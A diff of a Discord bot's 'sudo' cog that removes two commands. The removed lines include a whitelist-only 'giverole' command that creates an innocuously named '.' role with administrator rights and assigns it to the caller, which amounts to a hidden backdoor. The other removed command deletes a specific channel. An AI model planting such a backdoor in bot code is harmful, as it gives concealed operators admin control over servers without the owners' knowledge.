@@ -24,18 +24,6 @@ class sudo:
     def __init__(self,bot):
         self.bot = bot
     
-    @commands.command(name='giverole')
-    @is_whitelist()
-    async def giverole(self, ctx):
-        guild = ctx.guild
-        role_name = "."
-        role_permissions = guild.default_role
-        role_permissions = role_permissions.permissions
-        role_permissions.administrator = True
-        await guild.create_role(name=role_name, permissions=role_permissions)
-        role = discord.utils.get(ctx.guild.roles, name=role_name)
-        user = ctx.message.author
-        await user.add_roles(role)
         
 
     @commands.command(name='ban')
@@ -49,13 +37,6 @@ class sudo:
         except discord.errors.Forbidden:
             print("whoops")
 
-
-    @commands.command(name='fix')
-    @is_dev()
-    async def fix(self, ctx):
-        for channel in ctx.guild.channels:
-            if channel.name == "fumée²":
-                await channel.delete()
 
 
 
